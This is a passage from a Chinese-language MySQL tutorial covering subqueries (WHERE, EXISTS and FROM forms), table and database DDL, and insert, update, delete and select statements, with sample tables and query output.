ename=\u0026#39;谢吉娜\u0026#39;); SELECT ename,tel,did FROM t_employee WHERE did =ANY(SELECT did FROM t_employee WHERE ename=\u0026#39;白露\u0026#39; || ename=\u0026#39;谢吉娜\u0026#39;); #（4）在“t_employee”表中查询薪资比“白露”，“李诗雨”，“黄冰茹”三个人的薪资都要高的员工姓名和薪 资。 SELECT ename,salary FROM t_employee WHERE salary \u0026gt;ALL(SELECT salary FROM t_employee WHERE ename IN(\u0026#39;白露\u0026#39;,\u0026#39;李诗雨\u0026#39;,\u0026#39;黄 冰茹\u0026#39;)); #（5）查询“t_employee”和“t_department”表，按部门统计平均工资， #显示部门平均工资比全公司的总平均工资高的部门编号、部门名称、部门平均薪资， #并按照部门平均薪资升序排列。 SELECT t_department.did,dname,AVG(salary) FROM t_employee RIGHT JOIN t_department ON t_employee.did = t_department.did GROUP BY t_department.did HAVING AVG(salary) \u0026gt;(SELECT AVG(salary) FROM t_employee) ORDER BY AVG(salary); SELECT中的EXISTS型子查询 EXISTS型子查询也是存在外层SELECT的WHERE子句中，不过它和上面的WHERE型子查询的工作模式不相同，所以这里单独讨论它。\n如果EXISTS关键字后面的参数是一个任意的子查询，系统将对子查询进行运算以判断它是否返回行，如果至少返回一行，那么EXISTS的结果为true，此时外层查询语句将进行查询；如果子查询没有返回任何行，那么EXISTS的结果为false，此时外层查询语句不进行查询。EXISTS和NOT EXISTS的结果只取决于是否返回行，而不取决于这些行的内容，所以这个子查询输入列表通常是无关紧要的。\n如果EXISTS关键字后面的参数是一个关联子查询，即子查询的WHERE条件中包含与外层查询表的关联条件，那么此时将对外层查询表做循环，即在筛选外层查询表的每一条记录时，都看这条记录是否满足子查询的条件，如果满足就再用外层查询的其他WHERE条件对该记录进行筛选，否则就丢弃这行记录。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #exist型子查询 /* （1）exists()中的子查询和外面的查询没有联合的情况下， 如果exists()中的子查询没有返回任何行，那么外面的子查询就不查了。 （2）exists()中的子查询与外面的查询有联合工作的情况下， 循环进行把外面查询表的每一行记录的值，代入()中子查询，如果可以查到结果， 就留下外面查询的这条记录，否则就舍去。 */ #（1）查询“t_employee”表中是否存在部门编号为NULL的员工， #如果存在，查询“t_department”表的部门编号、部门名称。 SELECT * FROM t_department WHERE EXISTS(SELECT * FROM t_employee WHERE did IS NULL); #（2）查询“t_department”表是否存在与“t_employee”表相同部门编号的记录， #如果存在，查询这些部门的编号和名称。 SELECT * FROM t_department WHERE EXISTS(SELECT * FROM t_employee WHERE t_employee.did = t_department.did); #查询结果等价于下面的sql SELECT DISTINCT t_department.* FROM t_department INNER JOIN t_employee ON t_department.did = t_employee.did; SELECT的FROM中嵌套子查询 当子查询结果是多列的结果时，通常将子查询放到FROM后面，然后采用给子查询结果取别名的方式，把子查询结果当成一张“动态生成的临时表”使用。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 #子查询嵌套在from后面 /* 当一个查询要基于另一个查询结果来筛选的时候， 另一个查询还是多行多列的结果，那么就可以把这个查询结果当成一张临时表， 放在from后面进行再次筛选。 */ #（1）在“t_employee”表中，查询每个部门的平均薪资， #然后与“t_department”表联合查询 #所有部门的部门编号、部门名称、部门平均薪资。 SELECT did,AVG(salary) FROM t_employee GROUP BY did; +------+-------------+ | did | AVG(salary) | +------+-------------+ | 1 | 11479.3125 | | 2 | 13978 | | 3 | 37858.25 | | 4 | 12332 | | 5 | 11725 | +------+-------------+ 5 ROWS IN SET (0.00 sec) #用上面的查询结果，当成一张临时表，与t_department部门表做联合查询 #要给这样的子查询取别名的方式来当临时表用，不取别名是不可以的。 #而且此时的别名不能加\u0026#34;\u0026#34; #字段的别名可以加\u0026#34;\u0026#34;，表的别名不能加\u0026#34;\u0026#34; SELECT t_department.did ,dname,AVG(salary) FROM t_department LEFT JOIN (SELECT did,AVG(salary) FROM t_employee GROUP BY did) temp ON t_department.did = temp.did; #错误，from后面的t_department和temp表都没有salary字段， #SELECT t_department.did ,dname,AVG(salary)出现AVG(salary)是错误的 SELECT t_department.did ,dname,pingjun FROM t_department LEFT JOIN (SELECT did,AVG(salary) AS pingjun FROM t_employee GROUP BY did) temp ON t_department.did = temp.did; #（2）在“t_employee”表中查询每个部门中薪资排名前2的员工姓名、部门编号和薪资。 SELECT * FROM ( SELECT ename,did,salary, DENSE_RANK() over (PARTITION BY did ORDER BY salary DESC) AS paiming FROM t_employee) temp WHERE temp.paiming \u0026lt;=2; SQL示例演示 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 #演示和数据表相关的DDL语句 #为了方便接下来的演示，最好在前面确定针对哪个数据库的表格演示 #使用数据库 use test; #查看当前登录用户在本库下能够看到的所有表格 show tables; #如果前面没有use语句，或者在当前use语句下，要查看另一个数据库的表格。 show tables from 数据库名; #例如：查看当前数据库的表格 show tables; #例如：在当前use atguigu;下面，查看mysql库的表格 show tables from mysql; #创建表格 create table 表名称( 字段名1 数据类型1, 字段名2 数据类型2 #如果后面没有其他字段或约束的定义，后面就不用加, ); #例如：创建一个teacher表 /* 包含编号、姓名、性别、出生日期、薪资、电话号码 */ create table teacher( id int, name varchar(20), gender enum(\u0026#39;男\u0026#39;,\u0026#39;女\u0026#39;), birthday date, salary double, tel varchar(11) ); #查看表结构 desc 表名称; describe 表名称; #例如：查看teacher表的结构 desc teacher; describe teacher; mysql\u0026gt; describe teacher; +----------+-----------------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +----------+-----------------+------+-----+---------+-------+ | id | int | YES | | NULL | | | name | varchar(20) | YES | | NULL | | | gender | enum(\u0026#39;男\u0026#39;,\u0026#39;女\u0026#39;) | YES | | NULL | | | birthday | date | YES | | NULL | | | salary | double | YES | | NULL | | | tel | varchar(11) | YES | | NULL | | +----------+-----------------+------+-----+---------+-------+ 6 rows in set (0.00 sec) #查看表格的详细定义 show create table 表名称; #例如：查看teacher表的定义语句 show create table teacher; mysql\u0026gt; show create table teacher\\G *************************** 1. row *************************** Table: teacher Create Table: CREATE TABLE `teacher` ( `id` int DEFAULT NULL, `name` varchar(20) DEFAULT NULL, `gender` enum(\u0026#39;男\u0026#39;,\u0026#39;女\u0026#39;) DEFAULT NULL, `birthday` date DEFAULT NULL, `salary` double DEFAULT NULL, `tel` varchar(11) DEFAULT NULL ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci 1 row in set (0.00 sec) #修改表结构 #增加一个字段 alter table 表名称 add column 字段名 数据类型; #column表示列，字段，可以省略 #例如：给teacher表增加一个address varchar(100)字段 alter table teacher add column address varchar(100); mysql\u0026gt; desc teacher; +----------+-----------------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +----------+-----------------+------+-----+---------+-------+ | id | int | YES | | NULL | | | name | varchar(20) | YES | | NULL | | | gender | enum(\u0026#39;男\u0026#39;,\u0026#39;女\u0026#39;) | YES | | NULL | | | birthday | date | YES | | NULL | | | salary | double | YES | | NULL | | | tel | varchar(11) | YES | | NULL | | | address | varchar(100) | YES | | NULL | | +----------+-----------------+------+-----+---------+-------+ 7 rows in set (0.00 sec) #在某个字段后面增加一个字段 alter table 表名称 add column 字段名 数据类型 after 另一个字段; #column表示列，字段，可以省略 #例如：给teacher表增加一个cardid char(18)字段，增加到name后面 alter table teacher add column cardid char(18) after name; mysql\u0026gt; desc teacher; +----------+-----------------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +----------+-----------------+------+-----+---------+-------+ | id | int | YES | | NULL | | | name | varchar(20) | YES | | NULL | | | cardid | char(18) | YES | | NULL | | | gender | enum(\u0026#39;男\u0026#39;,\u0026#39;女\u0026#39;) | YES | | NULL | | | birthday | date | YES | | NULL | | | salary | double | YES | | NULL | | | tel | varchar(11) | YES | | NULL | | | address | varchar(100) | YES | | NULL | | +----------+-----------------+------+-----+---------+-------+ 8 rows in set (0.00 sec) #增加一个字段，称为第一个字段 alter table 表名称 add column 字段名 数据类型 first; #column表示列，字段，可以省略 #例如：给teacher表增加一个age int字段，增加到id前面 alter table teacher add column age int first; mysql\u0026gt; desc teacher; +----------+-----------------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +----------+-----------------+------+-----+---------+-------+ | age | int | YES | | NULL | | | id | int | YES | | NULL | | | name | varchar(20) | YES | | NULL | | | cardid | char(18) | YES | | NULL | | | gender | enum(\u0026#39;男\u0026#39;,\u0026#39;女\u0026#39;) | YES | | NULL | | | birthday | date | YES | | NULL | | | salary | double | YES | | NULL | | | tel | varchar(11) | YES | | NULL | | | address | varchar(100) | YES | | NULL | | +----------+-----------------+------+-----+---------+-------+ 9 rows in set (0.01 sec) #删除字段 alter table 表名称 drop column 字段名; #column可以省略 #例如：删除teacher表的age字段 alter table teacher drop column age; mysql\u0026gt; desc teacher; +----------+-----------------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +----------+-----------------+------+-----+---------+-------+ | id | int | YES | | NULL | | | name | varchar(20) | YES | | NULL | | | cardid | char(18) | YES | | NULL | | | gender | enum(\u0026#39;男\u0026#39;,\u0026#39;女\u0026#39;) | YES | | NULL | | | birthday | date | YES | | NULL | | | salary | double | YES | | NULL | | | tel | varchar(11) | YES | | NULL | | | address | varchar(100) | YES | | NULL | | +----------+-----------------+------+-----+---------+-------+ 8 rows in set (0.00 sec) #修改字段的数据类型 alter table 表名称 modify column 字段名 新的数据类型; #例如：修改teacher表的salary字段，数据类型修改为double(10,2) alter table teacher modify column salary double(10,2); mysql\u0026gt; desc teacher; +----------+-----------------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +----------+-----------------+------+-----+---------+-------+ | id | int | YES | | NULL | | | name | varchar(20) | YES | | NULL | | | cardid | char(18) | YES | | NULL | | | gender | enum(\u0026#39;男\u0026#39;,\u0026#39;女\u0026#39;) | YES | | NULL | | | birthday | date | YES | | NULL | | | salary | double(10,2) | YES | | NULL | | | tel | varchar(11) | YES | | NULL | | | address | varchar(100) | YES | | NULL | | +----------+-----------------+------+-----+---------+-------+ 8 rows in set (0.00 sec) #修改字段的名称 alter table 表名称 change column 旧字段名 新的字段名 数据类型; #例如：修改teacher表的tel字段，字段名修改为telphone alter table teacher change column tel telphone char(18); mysql\u0026gt; desc teacher; +----------+-----------------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +----------+-----------------+------+-----+---------+-------+ | id | int | YES | | NULL | | | name | varchar(20) | YES | | NULL | | | cardid | char(18) | YES | | NULL | | | gender | enum(\u0026#39;男\u0026#39;,\u0026#39;女\u0026#39;) | YES | | NULL | | | birthday | date | YES | | NULL | | | salary | double(10,2) | YES | | NULL | | | telphone | char(18) | YES | | NULL | | | address | varchar(100) | YES | | NULL | | +----------+-----------------+------+-----+---------+-------+ 8 rows in set (0.01 sec) #修改字段的顺序 alter table 表名称 modify column 字段名 数据类型 after 另一个字段; alter table 表名称 modify column 字段名 数据类型 first; #例如，把teacher表的salary调整到telphone后面 alter table teacher modify column salary double(10,2) after telphone; mysql\u0026gt; desc teacher; +----------+-----------------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +----------+-----------------+------+-----+---------+-------+ | id | int | YES | | NULL | | | name | varchar(20) | YES | | NULL | | | cardid | char(18) | YES | | NULL | | | gender | enum(\u0026#39;男\u0026#39;,\u0026#39;女\u0026#39;) | YES | | NULL | | | birthday | date | YES | | NULL | | | telphone | char(18) | YES | | NULL | | | salary | double(10,2) | YES | | NULL | | | address | varchar(100) | YES | | NULL | | +----------+-----------------+------+-----+---------+-------+ 8 rows in set (0.00 sec) #修改表名称 rename table 旧表名称 to 新表名称; alter table 表名称 rename 新表名称; #把teacher表重命名为jiaoshi rename table teacher to jiaoshi; #把jiaoshi表重命名为teacher alter table jiaoshi rename teacher; #删除表结构（数据一并删除） drop table 表名称; #删除teacher表格 drop table teacher; DML 添加语句 （1）添加一条记录到某个表中 1 insert into 表名称 values(值列表); #值列表中的值的顺序、类型、个数必须与表结构一一对应 1 2 3 4 5 6 7 8 9 10 11 12 13 14 mysql\u0026gt; desc teacher; +----------+------------------------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +----------+------------------------+------+-----+---------+-------+ | tid | int(11) | YES | | NULL | | | tname | varchar(5) | YES | | NULL | | | salary | double | YES | | NULL | | | weight | double | YES | | NULL | | | birthday | date | YES | | NULL | | | gender | enum(\u0026#39;男\u0026#39;,\u0026#39;女\u0026#39;) | YES | | NULL | | | blood | enum(\u0026#39;A\u0026#39;,\u0026#39;B\u0026#39;,\u0026#39;AB\u0026#39;,\u0026#39;O\u0026#39;) | YES | | NULL | | | phone | char(11) | YES | | NULL | | +----------+------------------------+------+-----+---------+-------+ 8 rows in set (0.00 sec) 1 2 insert into teacher values(1,\u0026#39;张三\u0026#39;,15000,120.5,\u0026#39;1990-5- 1\u0026#39;,\u0026#39;男\u0026#39;,\u0026#39;O\u0026#39;,\u0026#39;13789586859\u0026#39;); 1 2 3 4 5 insert into teacher values(2,\u0026#39;李四\u0026#39;,15000,\u0026#39;1990-5-1\u0026#39;,\u0026#39;男\u0026#39;,\u0026#39;O\u0026#39;,\u0026#39;13789586859\u0026#39;); #缺 体重weight的值 ERROR 1136 (21S01): Column（列） count（数量） doesn\u0026#39;t match（不匹配） value（值） count（数量) at row 1 （2）添加一条记录到某个表中 1 insert into 表名称 (字段列表) values(值列表); #值列表中的值的顺序、类型、个数必须与(字段列表)一一对应 1 insert into teacher(tid,tname,salary,phone) values(3,\u0026#39;王五\u0026#39;,16000,\u0026#39;15789546586\u0026#39;); （3）添加多条记录到某个表中 1 insert into 表名称 values(值列表),(值列表),(值列表); #值列表中的值的顺序、类型、个数必须与表结构一一对应 1 insert into 表名称 (字段列表) values(值列表),(值列表),(值列表); #值列表中的值的顺序、类型、个数必须与(字段列表)一一对应 1 2 3 4 insert into teacher (tid,tname,salary,phone) values(4,\u0026#39;赵六\u0026#39;,16000,\u0026#39;15789546586\u0026#39;), (5,\u0026#39;汪飞\u0026#39;,18000,\u0026#39;15789548886\u0026#39;), (6,\u0026#39;天琪\u0026#39;,19000,\u0026#39;15909546586\u0026#39;); （4）示例演示 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 #演示基本的，简单的DML语句 #基于tempdb数据库演示 create database tempdb; use tempdb; #创建teacher表 create table teacher( id int, name varchar(20), gender enum(\u0026#39;m\u0026#39;,\u0026#39;f\u0026#39;), birthday date, salary double, tel varchar(11) ); #查看teacher表结构 mysql\u0026gt; desc teacher; +----------+---------------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +----------+---------------+------+-----+---------+-------+ | id | int | YES | | NULL | | | name | varchar(20) | YES | | NULL | | | gender | enum(\u0026#39;m\u0026#39;,\u0026#39;f\u0026#39;) | YES | | NULL | | | birthday | date | YES | | NULL | | | salary | double | YES | | NULL | | | tel | char(18) | YES | | NULL | | +----------+---------------+------+-----+---------+-------+ 6 rows in set (0.01 sec) #添加数据 #（1）第一种情况，给所有字段赋值 insert into 表名称 values(值列表); #这种情况要求(值列表)的每一个值的类型、顺序与表结构一一对应 #表中有几个字段，(值列表)必须有几个值，不能多也不能少 #值如果是字符串或日期类型，需要加单引号 #例如：添加一条记录到teacher表 insert into teacher values (1,\u0026#39;张三\u0026#39;,\u0026#39;m\u0026#39;,\u0026#39;1998-7-8\u0026#39;,15000.0,\u0026#39;18256953685\u0026#39;); #例如：添加一条记录到teacher表 insert into teacher values (2,\u0026#39;李四\u0026#39;,\u0026#39;f\u0026#39;,\u0026#39;1998-7-8\u0026#39;,15000.0); #少了电话号码 mysql\u0026gt; insert into teacher values -\u0026gt; (2,\u0026#39;李四\u0026#39;,\u0026#39;f\u0026#39;,\u0026#39;1998-7-8\u0026#39;,15000.0); ERROR 1136 (21S01): Column count doesn\u0026#39;t match value count at row 1\u0026#39; #(值列表)中值的数量和表结构中column列的数量不一致。 #例如：添加一条记录到teacher表 insert into teacher values (2,\u0026#39;李四\u0026#39;,\u0026#39;f\u0026#39;,\u0026#39;北京宏福苑\u0026#39;,15000.0,\u0026#39;18256953685\u0026#39;); #把生日写称为地址 mysql\u0026gt; insert into teacher values -\u0026gt; (2,\u0026#39;李四\u0026#39;,\u0026#39;f\u0026#39;,\u0026#39;北京宏福苑\u0026#39;,15000.0,\u0026#39;18256953685\u0026#39;); ERROR 1292 (22007): Incorrect date value: \u0026#39;北京宏福苑\u0026#39; for column \u0026#39;birthday\u0026#39; at row 1 #日期格式不对 #（2）第二种情况，给部分字段赋值 insert into 表名称 (部分字段列表) values(值列表); #此时(值列表)中的值的数量、格式、顺序与(部分字段列表)对应即可 #例如：添加一条记录到teacher表，只给id和name字段赋值 insert into teacher (id,name) values (2,\u0026#39;李四\u0026#39;); mysql\u0026gt; select * from teacher; +------+------+--------+------------+--------+-------------+ | id | name | gender | birthday | salary | tel | +------+------+--------+------------+--------+-------------+ | 1 | 张三 | m | 1998-07-08 | 15000 | 18256953685 | | 2 | 李四 | NULL | NULL | NULL | NULL | +------+------+--------+------------+--------+-------------+ 2 rows in set (0.00 sec) #没有赋值的字段都是默认值，此时默认值是NULL #这种情况，当某个字段设置了“非空NOT NULL”约束，又没有提前指定“默认值”， #那么在添加时没有赋值的话，会报错。明天演示非空约束。 #（3）一次添加多条记录 insert into 表名称 values(值列表1),(值列表2)...; insert into 表名称 (部分字段列表) values(值列表),(值列表2)...; #上面一个insert语句有几个(值列表)就表示添加几行记录。 #每一个值列表直接使用逗号分隔 #添加多条记录到teacher表 insert into teacher (id,name) values (3,\u0026#39;王五\u0026#39;), (4,\u0026#39;宋鑫\u0026#39;), (5,\u0026#39;赵志浩\u0026#39;), (6,\u0026#39;杨业行\u0026#39;), (7,\u0026#39;牛钰琪\u0026#39;); #查看数据 mysql\u0026gt; select * from teacher; +------+--------+--------+------------+--------+-------------+ | id | name | gender | birthday | salary | tel | +------+--------+--------+------------+--------+-------------+ | 1 | 张三 | m | 1998-07-08 | 15000 | 18256953685 | | 2 | 李四 | NULL | NULL | NULL | NULL | | 3 | 王五 | NULL | NULL | NULL | NULL | | 4 | 宋鑫 | NULL | NULL | NULL | NULL | | 5 | 赵志浩 | NULL | NULL | NULL | NULL | | 6 | 杨业行 | NULL | NULL | NULL | NULL | | 7 | 牛钰琪 | NULL | NULL | NULL | NULL | +------+--------+--------+------------+--------+-------------+ 7 rows in set (0.00 sec) 修改语句 修改所有行 1 update 表名称 set 字段名 = 值, 字段名 = 值; #给所有行修改 1 2 #修改所有人的薪资，都涨了1000 update teacher set salary = salary + 1000 ; 修改部分行 1 update 表名称 set 字段名 = 值, 字段名 = 值 where 条件; #给满足条件的行修改 1 2 #修改天琪的薪资降低5000 update teacher set salary = salary-5000 where tname = \u0026#39;天琪\u0026#39;; 删除 删除部分行 1 delete from 表名称 where 条件; 1 delete from teacher where tname = \u0026#39;天琪\u0026#39;; 删除整张表的数据，但表结构留下 1 delete from 表名称; 1 delete from teacher; 截断表，清空表中的数据，只有表结构 1 truncate 表名称; 1 truncate teacher; truncate表和delete表的区别：\ndelete是一条一条删除记录的。如果在事务中，事务提交之前支持回滚。（后面会讲事务）。\ntruncate是把整个表drop，新建一张，效率更高。就算在事务中，也无法回滚。\n同学问：是否可以删除salary字段的值，字段留着，值删掉\n可以实现，但是不是用delete，用update\n同学问：是否可以删除salary字段，连同字段和这个字段的数据都是删除\n可以实现，但是不是用delete，用alter table 表名称 drop column 字段名;\n同学问：只删除某个单元格的值\n可以实现，但是不是用delete，用update\n数据库SQL语言使用案例 操作数据库 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 /* 查询所有数据库 标准语法： SHOW DATABASES; */ -- 查询所有数据库 SHOW DATABASES; /* 查询某个数据库的创建语句 标准语法： SHOW CREATE DATABASE 数据库名称; */ -- 查询mysql数据库的创建语句 SHOW CREATE DATABASE mysql; /* 创建数据库 标准语法： CREATE DATABASE 数据库名称; */ -- 创建db1数据库 CREATE DATABASE db1; /* 创建数据库，判断、如果不存在则创建 标准语法： CREATE DATABASE IF NOT EXISTS 数据库名称; */ -- 创建数据库db2(判断，如果不存在则创建) CREATE DATABASE IF NOT EXISTS db2; /* 创建数据库、并指定字符集 标准语法： CREATE DATABASE 数据库名称 CHARACTER SET 字符集名称; */ -- 创建数据库db3、并指定字符集utf8 CREATE DATABASE db3 CHARACTER SET utf8; -- 查看db3数据库的字符集 SHOW CREATE DATABASE db3; -- 练习：创建db4数据库、如果不存在则创建，指定字符集为gbk操作数据表 CREATE DATABASE IF NOT EXISTS db4 CHARACTER SET gbk; -- 查看db4数据库的字符集 SHOW CREATE DATABASE db4; /* 修改数据库的字符集 标准语法： ALTER DATABASE 数据库名称 CHARACTER SET 字符集名称; */ -- 修改数据库db4的字符集为utf8 ALTER DATABASE db4 CHARACTER SET utf8; -- 查看db4数据库的字符集 SHOW CREATE DATABASE db4; /* 删除数据库 标准语法： DROP DATABASE 数据库名称; */ -- 删除db1数据库 DROP DATABASE db1; /* 删除数据库，判断、如果存在则删除 标准语法： DROP DATABASE IF EXISTS 数据库名称; */ -- 删除数据库db2，如果存在 DROP DATABASE IF EXISTS db2; /* 使用数据库 标准语法： USE 数据库名称; */ -- 使用db4数据库 USE db4; /* 查询当前使用的数据库 标准语法： SELECT DATABASE(); */ -- 查询当前正在使用的数据库 SELECT DATABASE(); 操作数据表 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 -- 使用mysql数据库 USE mysql; /* 查询所有数据表 标准语法： SHOW TABLES; */ -- 查询库中所有的表 SHOW TABLES; /* 查询表结构 标准语法： DESC 表名; */ -- 查询user表结构 DESC USER; /* 查询数据表的字符集 标准语法： SHOW TABLE STATUS FROM 数据库名称 LIKE \u0026#39;表名\u0026#39;; */ -- 查看mysql数据库中user表字符集 SHOW TABLE STATUS FROM mysql LIKE \u0026#39;user\u0026#39;; /* 创建数据表 标准语法： CREATE TABLE 表名( 列名 数据类型 约束, 列名 数据类型 约束, ... 列名 数据类型 约束 ); */ -- 创建一个product商品表(商品编号、商品名称、商品价格、商品库存、上架时间) CREATE TABLE product( id INT, NAME VARCHAR(20), price DOUBLE, stock INT, insert_time DATE ); -- 查看product表详细结构 DESC product; /* 修改表名 标准语法： ALTER TABLE 旧表名 RENAME TO 新表名; */ -- 修改product表名为product2 ALTER TABLE product RENAME TO product2; /* 修改表的字符集 标准语法： ALTER TABLE 表名 CHARACTER SET 字符集名称; */ -- 查看db3数据库中product2数据表字符集 SHOW TABLE STATUS FROM db3 LIKE \u0026#39;product2\u0026#39;; -- 修改product2数据表字符集为gbk ALTER TABLE product2 CHARACTER SET gbk; /* 给表添加列 标准语法： ALTER TABLE 表名 ADD 列名 数据类型; */ -- 给product2表添加一列color ALTER TABLE product2 ADD color VARCHAR(10); /* 修改表中列的数据类型 标准语法： ALTER TABLE 表名 MODIFY 列名 数据类型; */ -- 将color数据类型修改为int ALTER TABLE product2 MODIFY color INT; -- 查看product2表详细信息 DESC product2; /* 修改表中列的名称和数据类型 标准语法： ALTER TABLE 表名 CHANGE 旧列名 新列名 数据类型; */ -- 将color修改为address ALTER TABLE product2 CHANGE color address VARCHAR(200); -- 查看product2表详细信息 /* 删除表中的列 标准语法： ALTER TABLE 表名 DROP 列名; */ -- 删除address列 ALTER TABLE product2 DROP address; /* 删除表 标准语法： DROP TABLE 表名; */ -- 删除product2表 DROP TABLE product2; /* 删除表，判断、如果存在则删除 标准语法： DROP TABLE IF EXISTS 表名; */ -- 删除product2表，如果存在则删除 DROP TABLE IF EXISTS product2; 新增表数据 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 /* 给指定列添加数据 标准语法： INSERT INTO 表名(列名1,列名2,...) VALUES (值1,值2,...); */ -- 向product表添加一条数据 INSERT INTO product (id,NAME,price,stock,insert_time) VALUES (1,\u0026#39;手 机\u0026#39;,1999.99,25,\u0026#39;2020-02-02\u0026#39;); -- 向product表添加指定列数据 INSERT INTO product (id,NAME,price) VALUES (2,\u0026#39;电脑\u0026#39;,3999.99); /* 给全部列添加数据 标准语法： INSERT INTO 表名 VALUES (值1,值2,值3,...); */ -- 默认给全部列添加数据 INSERT INTO product VALUES (3,\u0026#39;冰箱\u0026#39;,1500,35,\u0026#39;2030-03-03\u0026#39;); /* 批量添加所有列数据 标准语法： INSERT INTO 表名 VALUES (值1,值2,值3,...),(值1,值2,值3,...),(1,值2,值3,...); */ -- 批量添加数据 INSERT INTO product VALUES (4,\u0026#39;洗衣机\u0026#39;,800,15,\u0026#39;2030-05-05\u0026#39;),(5,\u0026#39;微波 炉\u0026#39;,300,45,\u0026#39;2030-06-06\u0026#39;); 修改和删除表数据 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 /* 修改表数据 标准语法： UPDATE 表名 SET 列名1 = 值1,列名2 = 值2,... [where 条件]; */ -- 修改手机的价格为3500 UPDATE product SET price=3500 WHERE NAME=\u0026#39;手机\u0026#39;; -- 修改电脑的价格为1800、库存为36 UPDATE product SET price=1800,stock=36 WHERE NAME=\u0026#39;电脑\u0026#39;; /* 删除表数据 标准语法： DELETE FROM 表名 [WHERE 条件]; */ -- 删除product表中的微波炉信息 DELETE FROM product WHERE NAME=\u0026#39;微波炉\u0026#39;; -- 删除product表中库存为10的商品信息 DELETE FROM product WHERE stock=10; 查询_数据准备 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 -- 创建db1数据库 CREATE DATABASE db1; -- 使用db1数据库 USE db1; -- 创建数据表 CREATE TABLE product( id INT, -- 商品编号 NAME VARCHAR(20), -- 商品名称 price DOUBLE, -- 商品价格 brand VARCHAR(10), -- 商品品牌 stock INT, -- 商品库存 insert_time DATE -- 添加时间 ); -- 添加数据 INSERT INTO product VALUES (1,\u0026#39;华为手机\u0026#39;,3999,\u0026#39;华为\u0026#39;,23,\u0026#39;2088-03-10\u0026#39;), (2,\u0026#39;小米手机\u0026#39;,2999,\u0026#39;小米\u0026#39;,30,\u0026#39;2088-05-15\u0026#39;), (3,\u0026#39;苹果手机\u0026#39;,5999,\u0026#39;苹果\u0026#39;,18,\u0026#39;2088-08-20\u0026#39;), (4,\u0026#39;华为电脑\u0026#39;,6999,\u0026#39;华为\u0026#39;,14,\u0026#39;2088-06-16\u0026#39;), (5,\u0026#39;小米电脑\u0026#39;,4999,\u0026#39;小米\u0026#39;,26,\u0026#39;2088-07-08\u0026#39;), (6,\u0026#39;苹果电脑\u0026#39;,8999,\u0026#39;苹果\u0026#39;,15,\u0026#39;2088-10-25\u0026#39;), (7,\u0026#39;联想电脑\u0026#39;,7999,\u0026#39;联想\u0026#39;,NULL,\u0026#39;2088-11-11\u0026#39;); 查询_查询全部 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 /* 查询全部数据 标准语法： SELECT * FROM 表名; */ -- 查询product表所有数据 SELECT * FROM product; /* 查询指定列 标准语法： SELECT 列名1,列名2,... FROM 表名; */ -- 查询名称、价格、品牌 SELECT NAME,price,brand FROM product; /* 去除重复查询 标准语法： SELECT DISTINCT 列名1,列名2,... FROM 表名; */ -- 查询品牌 SELECT brand FROM product; -- 查询品牌，去除重复 SELECT DISTINCT brand FROM product; /* 计算列的值 标准语法： SELECT 列名1 运算符(+ - * /) 列名2 FROM 表名; 如果某一列为null，可以进行替换 ifnull(表达式1,表达式2) 表达式1：想替换的列 表达式2：想替换的值 */ -- 查询商品名称和库存，库存数量在原有基础上加10 SELECT NAME,stock+10 FROM product; -- 查询商品名称和库存，库存数量在原有基础上加10。进行null值判断 